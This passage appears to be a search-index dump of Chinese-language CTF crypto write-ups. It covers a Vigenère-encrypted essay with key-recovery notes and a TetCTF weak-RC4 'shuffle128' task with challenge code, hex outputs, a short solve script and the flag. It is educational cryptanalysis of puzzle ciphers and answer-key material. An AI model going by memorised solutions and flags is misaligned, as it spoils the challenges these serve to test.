bxmrh ks zgfvqx xui svwmui kotuii (gzgqoqtk glv zmtdvu\u2013bmtie\u00e8vm eykpkv vr 1918), syb pe hizxrv nliv xz loh, glv gqrxzz cef wkmtn lpttieespm ve xzetgeeetaida. bierrq'a yems, nsjimiz, glzvzynpcc tgt ow zlr sei-bkcz xgh, n xyiwtuoqieypp-yvdhziqeopv gqrxzz.[12] jifgimxvyjv zlr zzkmp\u00e8hz awynvv sz xybmt\u00e8vr xrftg, qgau oasnr iu jcm zeoyce zgsoi, iea fv yagt awx iagicxvyjv grq hvgzafoqur. vr r gigivz imclvv, mcsc tkxgii sn vxz irtuesib ki npojgiu etqdb auqr rlqjgh jn vpngvw. nqh zfgqcpv, mv c svmyee gztpgh jn ylvjk 3, e eqkgl hipsdi l, d mjcrh oitsug u, t euyyh sikqcz j grq wf sv. vxz dokrr\u00e8ii kkfcmx lnw jidghvt ierwrv kkfcmxw vr jiywuikk avxy hqhvzzkrg wymnv lvtaif. xf ivehtxz, e gespm qv vtvlnfvxa eqi jk yfiu, xmtczl g xnflpi tuxbg, zvkvr\u00e8zg ilcgvr si zqiui\u00e8zk xnfci. qv xva zlr ectpcrzb cvvxkiv qko 26 boqrw zr lkvamxiax iseu, uvkn eytyejgj npojgiu ggebdkgpyc ks bju gmlx psdtituy bu xui gvmxyjcy eytyejgj, xwxvrwgsvfyio zs glv 26 twuidjri pevwit sdxniew. rx lkvamxiax gsqpjn qt xui vrktokbosa tiskgin, bni pmglmt knmy e qmwjmtuib gpclrfmv vmws sai fj bju mwcw. glv etrxvjkx hwvh iv uvkn tbmex lgfzvjw br r vmruvbort ovceqhy.[koxnxzsv puzlkh] ssi ifccktk, whtgsag jciz xui gpikdomdx gs si mpsmgvxrh zw ivjvkqeghrav. vxz xkvfse wmptdvm xui diauqbm ilbsjia c azgcseh rrl tukmgxf mk yvvyg qz qnxtlmu jcm riakkl wh jcm vpnmexmzj, awx ikedttg, jcm qilafvl \"nuhwt\": prqfrtgcjvri retl zqm nbgvgw nmbj q fme prxkiz. vxz zkwg sw xpg hje nsyhj xpg bzbziew r xw b (yi anmsxvh wttzz). gpglfyoj jcmxi nvv 26 oma hjey wusnr, i eeym cmyp lwm qdgg gw zeec sgon (lojsiiivv qgxneoikw) iu jcmxi nvv yvkgpm rigxvva kd opk orc jxzkdb, pkvr nlwb 5 muta: {r, i, z, s, e}. jtcw, '{' vvj 'zvkvrmtudabiecveaaxpp' grq '}' jfv awsxmywvzv pmvjzzy ss xyi uginimi, fytgmuiddk prxkizu ea bni xip wbtyio cmyp si bcazv grq irgp ounagkr pvxbgh zvimclvvmf rt cymak zxa eemzkwcsehqpw fme vba. klm pusb rigxvv wh jcm qil mj gpqizv, grq xyeb ter qy kbrv etqdb bu jvru xpg sjtaqa lvelkdb bneg qrxkjun bni zijwiiu xpgvngkiz. vxz tkxgii eb vxz qtxrvjikvyjv uj [xip-vwy, cno-isy] mj xpg uikotuiiil nuobkv. ssi ifccktk, xui wmzuj gmzxrv fj bju ktgmaxvbb, c, yn xgmeiu aqvx g, bni smiwb nuobkv bj klm mut. bnieiwszg, hje r eah tstwci i uj glv zqiui\u00e8zk wdyrvm chz cyiq, rrqmno g. aoqvprvta, vjz zlr wvgwpt gmzxrv fj bju ktgmaxvbb, vxz akgbru pmvjzz uj glv oma yn cyiq. xyi tgjomx eg vfa m cdy kuphqe x qu n. opk vrwk sn vxz xrevrkifv yn mtgvtyizgt dv g wvqzpit vvanmbr: gpikdomdx: nxkekmqolgaa ovc: tgcjvrizsepm eykpkvgiox: tzvjxbisvelz fuxzetgmfr qu fzzlseqvh ja wjqtk gs klm ter qt xui kejnu xwxvrwgsvfyio zs glv oma, vdvjmak klm renqzmbr fj bju xqvlrvkifv bzbzie me xpcj mwc eah klmp knqtk glv gwnkhv'y pnfvp iu jcm vpnmexmzj. awx ikedttg, yi zua y (jisu nuhwt), xui tmxjumbkbg p rtxgqma or pscyup q, rpogu mj xpg vdzyx cprmvvusb rigxvv. vgno, zua r (jisu nuhwt) mf kfrm ve, opk gvtyizvusb d mf pfgivuy bneg mj jwwdy qt gbplqv v. jccy x vw klm uuxwth cprmvvusb rigxvv. \u89e3\u9898\u601d\u8def \u00b6 \u89c2\u5bdf\u5168\u6587\uff0c\u9664\u5355\u8bcd\u62fc\u5199\u65e0\u610f\u4e49\u5916\uff0c\u6587\u7ae0\u7ed3\u6784\u5b8c\u6574\uff0c\u63a8\u6d4b\u66fe\u7ecf\u8fc7\u4ee3\u6362\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5982\u51ef\u6492\u5bc6\u7801\u3001\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7b49 \u5c1d\u8bd5\u4f7f\u7528\u51ef\u6492\u5bc6\u7801\u7834\u89e3\u6587\u7ae0\u7684\u5176\u4e2d\u4e00\u90e8\u5206\uff0c\u5e76\u672a\u83b7\u5f97\u6709\u7528\u7684\u7ed3\u679c \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u89e3\u7801\u9700\u8981\u77e5\u9053\u5bc6\u94a5 \u7b2c\u56db\u6bb5\u6700\u540e\u4e00\u53e5 opk gvtyiz kd opk 16xu gvrbwht \u51fa\u73b0\u4e86\u91cd\u590d\u7684\u5355\u8bcd\uff0c\u7531\u6b64\u53ef\u4ee5\u5f97\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\u4e3a \\(11\\) \u5173\u4e8e\u5bc6\u94a5\u5185\u5bb9\uff0c\u5165\u624b\u70b9\u9996\u5148\u5728 ... frxnimp 1914 qil 1940. \uff0c\u6839\u636e\u5355\u8bcd\u957f\u5ea6\u548c\u4e24\u4e2a\u5e74\u4efd\u53ef\u4ee5\u63a8\u6d4b\u51fa\u539f\u6587 ... between 1914 and 1940. \u4f7f\u7528 Vigenere Cipher - Online Decoder, Encoder, Solver, Translator \u7684 Knowing only a partial key \u4f9d\u6b21\u7834\u89e3\u83b7\u5f97\u90e8\u5206\u5bc6\u94a5 enereicqvi \uff08\u987a\u5e8f\u672a\u77e5\uff09 \u518d\u6b21\u67e5\u770b opk gvtyiz kd opk 16xu gvrbwht \uff0c 16xu \u5e94\u8be5\u4e3a 16th \uff0c\u90a3\u4e48 opk \u5219\u5bf9\u5e94 the \uff0c\u5219\u901a\u8fc7 opk 16xu \u83b7\u5f97\u90e8\u5206\u5bc6\u94a5 vigen \uff0c\u5219\u5b8c\u6574\u5bc6\u94a5\u4e3a enereicqvig \uff08\u987a\u5e8f\u672a\u77e5\uff09 \u6587\u7ae0\u5f00\u5934 bju \u63a8\u6d4b\u539f\u6587\u4e3a the \uff0c\u83b7\u5f97\u5b9e\u9645\u5bc6\u94a5\u4e3a icqvigenere \uff0c\u89e3\u5bc6\u83b7\u5f97 flag \uff1a","title":"shanghai"},{"location":"crypto/shanghai/#_1","text":"shanghai.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 bju lcogx fisep vjf pyztj sdgh 13 gifc qsxw. pkiowxc glv jqtio ekpy-hfgcouibkh qijgzkfoqur bj r twnovtvlnfvxqe sdxnie arw nqhhcregiu fg nujv hegxzwbc qgjkvgm rvwwdy 1467 ith hwvh i ouoir gvtyiz fynk zs fazxkj rzbcirr tmxjum irtuesibu. qgjkvgm'j wgujzu uryc jaqvscmj eytyejgjn ilxrv jidghvt csehj, evf irqzguij amtu dvjmpekil do rzoxvrx xpg bzbzie sw xpg sjzxiftfrlkdb irtuesib kd opk gvtyizvusb. regii, mv 1508, lecitrrw kvqvxzuoyf, me lqu mjzq tbpzkzcfcqg, mazvrbgt opk xnflpi tuxbg, e pvzxqeqg kuqcseivv ea bni imxiv\u00e8tu xqvlrv. klm vhdbnizmlw kkfcmx, lbavzmt, eite tesmmlgt v xxstvvwaklz, zokvh rrl rhzloggespm uonbkq ssi wekjxport fvxegui kotuii etrxvjkxf.[gzxivyjv tirhvh] ejqo qy rba brwyd va zlr zzkmp\u00e8hz kotuii aiu emqmmaecpg funkxmoiu fg iyjdgr oekxqujv jkpyejs qp xda 1553 hsbo ce kkvmi jiy wzk. okeqit fnxkmavq wmrpnwf.[4] lm dkdtz ycse xpg jvjapn vvgbc ea bxmglvqqwi wcz eqhvh i tukmgxvrx \"gwwdomxwvke\" (e sgo) ow yavxtl kkfcmx eytyejgjn mbiec cibvum. enieirw inrzzzm nru xzkjcmsmhw lwmf q aqdiq trxbghi wl whfjxqvkoqurf, fvptcij'a yguidi ugqib zlr trxbghi wl whfjxqvkoqurf gfytf rz mgwvpp gpcdbmj, wvqgpg do nmripxzro c dze qil. ovca yumm zccmtetno nqtkyi nszfi jz ylbvk tptqnmy, oasnr bq rjbn tnvkmmu yi ijznrti, wt jmitwzmkxmf \"epb uj oeeh\" ineio cmgl klm ounagkr. fvptcij'a siglfh bjkn zkuhmiil ujmwtk fityzkjt nuv brcc bju fme. ef mk ma tugizmiicc mcit bu wrglvm c icwxx xip tptqnm, yypl rw ja q kzkzvslw xtyqizi psezmtivbosa, fvptcij'a ycfxvq eci xwtwvhvvidbt uuvr wvgctu.[xqzegmfr vguymj] fyezwm fu qqmia\u00e8vv tcdbdaniq lzw lgixzotgmfr wh q nqsmyei fcv iozurtii ecvefme gvtyiz duawxi glv gwwho wl lrric qky jn lvnrti, qp 1586.[5] bvbkv, vr klm 19vx xmtxhvp, xpg yidkrgmfr wh rztrefs'j gqrxzz cef qzwivjmqhygiu xw xybmt\u00e8vr. hrzqf avpt, ma lzw jqef, bni psuijtuvskvf prqmpjzl zlr qzwivjmqhygmfr ja ivgort xyeb jynbuvl lrh \"qidjzkh glzw qofjzzeax tsvvhdjaxvse evf yiazinh eeugt v zkkeijwqxu vvj iyidivvqmg imclvv nqh cqs [zvkvr\u00e8zg] jcwaku lv lif djbnmak ks lq mdbn mg\".[6] xyi dkwzv\u00e8xi pmglmt wvqtiq e iixwjvbosa jfv jgyio kbpigxqqdvtrc fxisvi. djbkh nyklwt qil seglvqivyxqgr plrvtgi gczavhxi lqtbaur (yinma eqmzupy) grptgt opk zvkvr\u00e8zg sdxnie yefzgqfihpr me lqu 1868 fdmii \"glv etrxvjkx pmglmt\" yi i ilvpuvmp'i himemmei. qp 1917, ixqkrgmwmk cczzognr uiaehdjkh glv zqiui\u00e8zk gvtyiz ci \"duvsfwzftg ea bxeawcebkei\".[7][8] bneg vvtcvqoqur jej rwv tzakviiu. gpchgmy fnfseog yn stsjr ks pclz jxsxie e dchditx bj klm eykpkv nw vezno va 1854 hyg jrmtgt ow vyopzwp jyn euvx.[9] orwquad mtxvvvpg dhjsk xui tmxjum ith cyspquxzl zlr xvgppylck ma xyi 19bj szvzyec, syb glzv keepziz, uehm yovpcil ehtxzeaeccavi xwapq stgiuyjvgpyc svmca opk gvtyiz kd opk 16xu gvrbwht.[6] kxccxfkzcfcqi wymui zwbz cyiq ej e kcbxcregmfr ikt wg zlr wnmau qmue frxnimp 1914 qil 1940. zlr zzkmp\u00e8hz kotuii ma uyhxri rrfyoj jj jk e smvpl eykpkv vj zx qu knmj ma gfrrwdxbosa azxp eykpkv qmjoa.[10] vxz kursiuizcjz azegij sn cczzogn, jfv mzqhxri, hwvh i dhvay gvtyiz fyns zs vqgpmouib zlr zzkmp\u00e8hz kotuii hctyio zlr edizksvv imimc ait. jcm isajvhmtqxg'y qrwjeogi rmxi sei jzqc nmivrx, rrl vxz ctmbr iiowbvzrc pvrgsgt dby qrwjeogi. opxshkyscv jcm cee, xyi kqdamjieeki tgqymxwumg tzkcvzopl vvpqgt pxur gliim mut xnvnwvw: \"ucdxpkwgii ftwva\", \"kuqcpvxm xyxbuvl\" eeh, iu jcm cee grqm ve v krsfi, \"tsug hzbxmoykmwp\".[11] wdthiex mizpqh bxmrh ks zgfvqx xui svwmui kotuii (gzgqoqtk glv zmtdvu\u2013bmtie\u00e8vm eykpkv vr 1918), syb pe hizxrv nliv xz loh, glv gqrxzz cef wkmtn lpttieespm ve xzetgeeetaida. bierrq'a yems, nsjimiz, glzvzynpcc tgt ow zlr sei-bkcz xgh, n xyiwtuoqieypp-yvdhziqeopv gqrxzz.[12] jifgimxvyjv zlr zzkmp\u00e8hz awynvv sz xybmt\u00e8vr xrftg, qgau oasnr iu jcm zeoyce zgsoi, iea fv yagt awx iagicxvyjv grq hvgzafoqur. vr r gigivz imclvv, mcsc tkxgii sn vxz irtuesib ki npojgiu etqdb auqr rlqjgh jn vpngvw. nqh zfgqcpv, mv c svmyee gztpgh jn ylvjk 3, e eqkgl hipsdi l, d mjcrh oitsug u, t euyyh sikqcz j grq wf sv. vxz dokrr\u00e8ii kkfcmx lnw jidghvt ierwrv kkfcmxw vr jiywuikk avxy hqhvzzkrg wymnv lvtaif. xf ivehtxz, e gespm qv vtvlnfvxa eqi jk yfiu, xmtczl g xnflpi tuxbg, zvkvr\u00e8zg ilcgvr si zqiui\u00e8zk xnfci. qv xva zlr ectpcrzb cvvxkiv qko 26 boqrw zr lkvamxiax iseu, uvkn eytyejgj npojgiu ggebdkgpyc ks bju gmlx psdtituy bu xui gvmxyjcy eytyejgj, xwxvrwgsvfyio zs glv 26 twuidjri pevwit sdxniew. rx lkvamxiax gsqpjn qt xui vrktokbosa tiskgin, bni pmglmt knmy e qmwjmtuib gpclrfmv vmws sai fj bju mwcw. glv etrxvjkx hwvh iv uvkn tbmex lgfzvjw br r vmruvbort ovceqhy.[koxnxzsv puzlkh] ssi ifccktk, whtgsag jciz xui gpikdomdx gs si mpsmgvxrh zw ivjvkqeghrav. vxz xkvfse wmptdvm xui diauqbm ilbsjia c azgcseh rrl tukmgxf mk yvvyg qz qnxtlmu jcm riakkl wh jcm vpnmexmzj, awx ikedttg, jcm qilafvl \"nuhwt\": prqfrtgcjvri retl zqm nbgvgw nmbj q fme prxkiz. vxz zkwg sw xpg hje nsyhj xpg bzbziew r xw b (yi anmsxvh wttzz). gpglfyoj jcmxi nvv 26 oma hjey wusnr, i eeym cmyp lwm qdgg gw zeec sgon (lojsiiivv qgxneoikw) iu jcmxi nvv yvkgpm rigxvva kd opk orc jxzkdb, pkvr nlwb 5 muta: {r, i, z, s, e}. jtcw, '{' vvj 'zvkvrmtudabiecveaaxpp' grq '}' jfv awsxmywvzv pmvjzzy ss xyi uginimi, fytgmuiddk prxkizu ea bni xip wbtyio cmyp si bcazv grq irgp ounagkr pvxbgh zvimclvvmf rt cymak zxa eemzkwcsehqpw fme vba. klm pusb rigxvv wh jcm qil mj gpqizv, grq xyeb ter qy kbrv etqdb bu jvru xpg sjtaqa lvelkdb bneg qrxkjun bni zijwiiu xpgvngkiz. vxz tkxgii eb vxz qtxrvjikvyjv uj [xip-vwy, cno-isy] mj xpg uikotuiiil nuobkv. ssi ifccktk, xui wmzuj gmzxrv fj bju ktgmaxvbb, c, yn xgmeiu aqvx g, bni smiwb nuobkv bj klm mut. bnieiwszg, hje r eah tstwci i uj glv zqiui\u00e8zk wdyrvm chz cyiq, rrqmno g. aoqvprvta, vjz zlr wvgwpt gmzxrv fj bju ktgmaxvbb, vxz akgbru pmvjzz uj glv oma yn cyiq. xyi tgjomx eg vfa m cdy kuphqe x qu n. opk vrwk sn vxz xrevrkifv yn mtgvtyizgt dv g wvqzpit vvanmbr: gpikdomdx: nxkekmqolgaa ovc: tgcjvrizsepm eykpkvgiox: tzvjxbisvelz fuxzetgmfr qu fzzlseqvh ja wjqtk gs klm ter qt xui kejnu xwxvrwgsvfyio zs glv oma, vdvjmak klm renqzmbr fj bju xqvlrvkifv bzbzie me xpcj mwc eah klmp knqtk glv gwnkhv'y pnfvp iu jcm vpnmexmzj. awx ikedttg, yi zua y (jisu nuhwt), xui tmxjumbkbg p rtxgqma or pscyup q, rpogu mj xpg vdzyx cprmvvusb rigxvv. vgno, zua r (jisu nuhwt) mf kfrm ve, opk gvtyizvusb d mf pfgivuy bneg mj jwwdy qt gbplqv v. jccy x vw klm uuxwth cprmvvusb rigxvv.","title":"\u9898\u76ee"},{"location":"crypto/shanghai/#_2","text":"\u89c2\u5bdf\u5168\u6587\uff0c\u9664\u5355\u8bcd\u62fc\u5199\u65e0\u610f\u4e49\u5916\uff0c\u6587\u7ae0\u7ed3\u6784\u5b8c\u6574\uff0c\u63a8\u6d4b\u66fe\u7ecf\u8fc7\u4ee3\u6362\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5982\u51ef\u6492\u5bc6\u7801\u3001\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7b49 \u5c1d\u8bd5\u4f7f\u7528\u51ef\u6492\u5bc6\u7801\u7834\u89e3\u6587\u7ae0\u7684\u5176\u4e2d\u4e00\u90e8\u5206\uff0c\u5e76\u672a\u83b7\u5f97\u6709\u7528\u7684\u7ed3\u679c \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u89e3\u7801\u9700\u8981\u77e5\u9053\u5bc6\u94a5 \u7b2c\u56db\u6bb5\u6700\u540e\u4e00\u53e5 opk gvtyiz kd opk 16xu gvrbwht \u51fa\u73b0\u4e86\u91cd\u590d\u7684\u5355\u8bcd\uff0c\u7531\u6b64\u53ef\u4ee5\u5f97\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\u4e3a \\(11\\) \u5173\u4e8e\u5bc6\u94a5\u5185\u5bb9\uff0c\u5165\u624b\u70b9\u9996\u5148\u5728 ... frxnimp 1914 qil 1940. \uff0c\u6839\u636e\u5355\u8bcd\u957f\u5ea6\u548c\u4e24\u4e2a\u5e74\u4efd\u53ef\u4ee5\u63a8\u6d4b\u51fa\u539f\u6587 ... between 1914 and 1940. \u4f7f\u7528 Vigenere Cipher - Online Decoder, Encoder, Solver, Translator \u7684 Knowing only a partial key \u4f9d\u6b21\u7834\u89e3\u83b7\u5f97\u90e8\u5206\u5bc6\u94a5 enereicqvi \uff08\u987a\u5e8f\u672a\u77e5\uff09 \u518d\u6b21\u67e5\u770b opk gvtyiz kd opk 16xu gvrbwht \uff0c 16xu \u5e94\u8be5\u4e3a 16th \uff0c\u90a3\u4e48 opk \u5219\u5bf9\u5e94 the \uff0c\u5219\u901a\u8fc7 opk 16xu \u83b7\u5f97\u90e8\u5206\u5bc6\u94a5 vigen \uff0c\u5219\u5b8c\u6574\u5bc6\u94a5\u4e3a enereicqvig \uff08\u987a\u5e8f\u672a\u77e5\uff09 \u6587\u7ae0\u5f00\u5934 bju \u63a8\u6d4b\u539f\u6587\u4e3a the \uff0c\u83b7\u5f97\u5b9e\u9645\u5bc6\u94a5\u4e3a icqvigenere \uff0c\u89e3\u5bc6\u83b7\u5f97 flag \uff1a","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/shuffle128/","tags":["rc4"],"text":"#rc4 .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 A weak version of RC4. shuffle128.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 import sys from typing import List , Iterator from bitarray import bitarray # https://pypi.org/project/bitarray/ import random State = List [ int ] def swap ( arr : State , i : int , j : int ): arr [ i ] ^= arr [ j ] arr [ j ] ^= arr [ i ] arr [ i ] ^= arr [ j ] def rc4_key_scheduling ( key : bytes ) -> State : S = list ( range ( 128 )) j = 0 for i in range ( 128 ): j = ( j + S [ i ] + key [ i % len ( key )]) % 128 swap ( S , i , j ) return S def rc4_pseudo_random_generator ( S : State ) -> Iterator [ int ]: i = j = 0 while True : i = ( i + 1 ) % 128 j = ( j + S [ i ]) % 128 swap ( S , i , j ) yield S [( S [ i ] + S [ j ]) % 128 ] def shuffle ( s : bytes ) -> bytes : bits = bitarray () bits . frombytes ( s ) random . shuffle ( bits ) return bits . tobytes () def xor ( s1 : bytes , s2 : bytes ) -> bytes : assert len ( s1 ) == len ( s2 ) return bytes ( c1 ^ c2 for c1 , c2 in zip ( s1 , s2 )) if __name__ == '__main__' : from secret import FLAG random . seed ( 2023 ) print ( sys . version ) prg = rc4_pseudo_random_generator ( rc4_key_scheduling ( FLAG )) for _ in range ( 64 ): shuffled = shuffle ( FLAG ) key = bytes ( next ( prg ) for _ in range ( len ( FLAG ))) print ( xor ( shuffled , key ) . hex ()) # Output # 3.10.7 (main, Nov 24 2022, 19:45:47) [GCC 12.2.0] # 7dfdf6eba4da43bf7ca6eb64d3fbaac5e764b2c8e66e1f2a30e3b9e95b2ef48b28f105cdfc # 3353e19ed6a3ecad7716831b8cc149ad3a1990c8f4682c434d1b7f417e7df9e9ca0743fc3a # 2e15e68721c7773a920d9622cbad21b2d48e00358b1107b300ba19c3a48291dc1579eaf4f4 # e0f6b4e61390ce8d1eab002af797eb022c58a6576ef55c78b917268b9fe4d3f45dfc7d5dc3 # de11f01e825a69e5b1e004db1f79974ca9e42a2b0c0197dcb322f5a0e43cf7ddfdb529699d # 976dbf67bf2f67fd947c69696c5ef5bb9186b8031d279165a5fcd1f6ac9d7f668b847ecfc0 # 01f123b89f75d3ab5f744caa4dd892eac598a0b1413cc0abf93509b2bc254a5714fd979f7a # 488b3d4d110f2dca864f6589a58033cc23ca3618db8ce59f398b7b9a6dfd93220e1cd02538 # 6b92f7e54e6406b2d7d1176f5604e22cf4c6710ff35fa4cf7d33a7d1855a7f868da8713faa # f9302dccf5c000ef69c2440fbe22b7eaeb5a95483dda09a0b0414e297ad81fb64fabc60025 # c9b5dcf6031051d3433ddc358f7e18b3f7cec58b37bace17f2fd1e39b1cac64fbfcdbff2aa # bddac6c00310a5c80cb73d640a1b0592ed5d99984971a085941e7ea8e2fd0e86aaa1b7098f # 2ac7cdeb9e7eeb5abad2b4ed1238de39cb17aa4f4d8827ebd36d4a99acb9fb4e44cd365186 # b38ed3a76f5751faaca88fbae7ef53a6a4baa4f29b4bca0ef782b373969d3df62d9c276d69 # 20f40b4267ae37f994dac8fccbb652d29abce709dc9f52223ddebe441899edfb8dc3a31a5d # c9116855c08f1d04cbe6d86d0e9523c564fd3dd8bb79f7898ea7e624aba832e6530ad1231c # b388f35a0f2009326bf66170156e57a36eea83285698fcdf2ba1fbbad199dc9d7860158d5e # 1f8c81249a0428cd781494ada971c49e1cd7121af374ecc70d902ad0f4f736e4ef23f61fc9 # b70d877d5ff8c38096faecb1de2df31ce467372c09c66c54b8e122123b539966937bb94d52 # 72951dcfda3601c762b4ea5119e40e93bbe7a595a35db985cb990f3bbcc74ddc7157f0baff # ca0532f7df0239d0fe60e9a62852384f6cce737884808134fb1960e84803fb6ddc144df3c9 # 78f35e7e26df365e213787a3885ca11c76d14fb998d4a440826b2d8adaa5fe85065c9e9c0d # f3110f509bd39e5ead882e85ccb31906809a0c29e33a79f0b3229e671dba1353c89968c4a4 # 2ac15e7a5dcc821c58ac08d526e5a350ef994bb485fc1c916f59e366e6f7e7ddc76b4a0cae # 381a2afbc6aa95643248d8dd39c44fd7090746af9fa3f3c4f70ba56298d6ca1b36b7d19ec8 # b098dfffe1cd19019ba9c472f6f966964352a958eda8707553021870ba51c9a0b573a59f99 # 02578a8b58c1e9c9d5f4321e0b8eb66922905ec2dfd3bf1a6ef583fcce8846243cf6c609d9 # 93efb1acf6b268c5a79746a28c64adbbbc81924991e13aa971d64f4087c87650ebb6309daa # 9fcbff37a9919d676e6ce86d9bae8f75376b1a7a76de304c622fe163ea7549a8dcccb095f7 # ad25c09cdcc768b53a519daf6f1a0861b4c9530cc9d0cf82fbf7c9f5a9acc2346d611a21d0 # 08aee3c019e664d88f3f1147c4f52d33f2f4ab9fea176625f24a14d517a1d59d338e5bf0aa # 479de7e5e8e7841382bb7c9c844f7f8d900979bd360c6d84dc69bd17e7f4ced202afce5964 # 65c43c740e68be4ac64c559f09b461904be78fe5f5eaa6f78afb23a1d9c12ecf1d14a287a3 # 90063ef6a3b48091f514f1b87dc3ef40942989648043df1dda7d1221c0efea863f69f2fba6 # e4c2976ec29fec9cc3d04ec5f4dde4e282886be0c5ee471ccb8cd201558adb759375c27d78 # 1ec9458af0857b6f437ee5d72de707eb6d38df96a830bb53775667f9722a46869e0954b5ad # 5de6f6df232cc29f3fcaac177f323ecfd99732e7559f9d6ffdd706e387bcc23127891be4e1 # 7df2884288490b19fd7d20c746508c3ee8e77706c549ba5a07bf9cc183ede90e5cdd6cc59b # 6ebc5d2caff2d0fc8afb538ea990f4289f716375834a67966dc6eba35b7559726826c23bd4 # e6bdfbfe7f094d6ecfdf76433cfc3c64c5041ad8aeaf84ba5c8473b24d836f332e8e41eabe # 6b845fefb8e5fe2253600c137047ee029a1bab28e9b45eda71597169148593938049092ee2 # 1172b4a57311da2ff968e1071c4eff0bd22a333cfdc8a6fdef41a4b98f69620152bbeb60b5 # 5a788ee6a476eaaa3f581eaebc2589efa640ac37fc5faa4f3591b7db58234dd8fb9743192d # 07d49bf8af3cf3ac77db932a41b81d61736b7e8f5bb656b2a9637f57b7871c1297bf5e3b14 # 94d1d09e9c3d024538c4e5fedafbf5aed564d9998dec700647f704115f281efe74aefc0231 # b11b4ff19b77cd69f1881e5401c6e56a9bbf2e88bb443b3340de8d01c4768c6efa34233b35 # dfc7edc0fa6232d7df18717c9dec7631295a035afdeeea7e2dfaec3518e58c8189f65dd52f # 5490e892fca7f4be4312ad69b1eed46e11cb94bf8bafd2ef725e77fd9620ba980fa1d46563 # b9066eb49cb42ecfdcd9f7713e0feddb920043908df127cf35386df3b4bce6fab3c6a3e89f # 8c51507ea79ffb2914436f8c9fa39501d89b8f9446cbe2fcfb0bada4886ff76b20ce1e29f3 # 6df94fc313b82da575073aeb54c35e5d3ff0c9dc7032cbffcc92b47b2fead75610d6157bca # b92cf23e538fc6b3d1c0e28dd81f3c2a58d890bf323da321a39c9fb601caee4bcc1ccc9abd # 0cc0985f966eb484c5f26b9bb8821dabf3b88d3471b55c6351a43fde32428519241a0ddd76 # 78cf7e7bf1ffa53812d1c9b47fc23852b2fcd318f7ea21dba12ad3a1d4f38e2ba1a5116aa9 # e35e377f7972b49fbb82a42f90443ca77adb678fa278bf93046c8ec2bc05cb2155d5b506d6 # 3bc4ffa6eb16c6da6c40d78b132131092bc8f0696a81e14deca5018daea56c6678befbc1f8 # 138d167661180fc7b7c52fa821c518a29d41c5a73aee9969f74b096cff8fca7ead4f5affe9 # 3784f8b584545b1ef09aa3815182776966eb9d4758f25ae89550aee3916dce6f40d29c79ee # 09913e8ed1778c95cbac302c86cc4ba5ad8b5fe113c78352d00979e84dcd10c3ecd036fba0 # d1ed85304ea4a3e03233544efb85017c9cd1d3259d959acc0f0dbdaece9ed668d937d52309 # e6b89393cfd0e888c8dce582495d216760eb1a8032103351d15c8033a46aae338a11ac99ee # 92683cb1cb9f24a7925395f54be8b0e520ffd5afbc80c11256e33324bf2509a1c9b64f46dc # 0b7e5204fba4ceec74ee7b35417ecb88fa8a74c6575bb6de8f15f1257b6e02a42e4b56dff0 # 49d609e06cb04aa787ebe99d741d4b60b909a00c0de6faecbf4c6d21559495a7c67060625d \u89e3\u9898\u601d\u8def \u00b6 RC4 \u5728\u5b9e\u73b0\u4e0a\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u91cd\u70b9\u5728 S \u6570\u7ec4\u7684\u8303\u56f4\u5728 \\([0, 127]\\) \uff0c\u6240\u4ee5\u6bcf\u6b21\u5f02\u6216\u90fd\u4f1a\u6cc4\u6f0f Flag \u5b57\u8282\u7684\u6700\u9ad8\u6709\u6548\u4f4d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import random cts = [ '7dfdf6eba4da43bf7ca6eb64d3fbaac5e764b2c8e66e1f2a30e3b9e95b2ef48b28f105cdfc' , ... '49d609e06cb04aa787ebe99d741d4b60b909a00c0de6faecbf4c6d21559495a7c67060625d' ] flag_bits = [ 0 ] * 37 * 8 random . seed ( 2023 ) for ct in cts : a = list ( range ( 37 * 8 )) random . shuffle ( a ) for i , c in zip ( a [:: 8 ], bytes . fromhex ( ct )): flag_bits [ i ] = c >> 7 print ( int ( '' . join ( map ( str , flag_bits )), 2 ) . to_bytes ( 37 , 'big' )) Flag \u00b6 TetCTF{ _1nsuff1c13nt 3ntr0py ___}","title":"shuffle128"},{"location":"crypto/shuffle128/#_1","text":"A weak version of RC4. shuffle128.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 import sys from typing import List , Iterator from bitarray import bitarray # https://pypi.org/project/bitarray/ import random State = List [ int ] def swap ( arr : State , i : int , j : int ): arr [ i ] ^= arr [ j ] arr [ j ] ^= arr [ i ] arr [ i ] ^= arr [ j ] def rc4_key_scheduling ( key : bytes ) -> State : S = list ( range ( 128 )) j = 0 for i in range ( 128 ): j = ( j + S [ i ] + key [ i % len ( key )]) % 128 swap ( S , i , j ) return S def rc4_pseudo_random_generator ( S : State ) -> Iterator [ int ]: i = j = 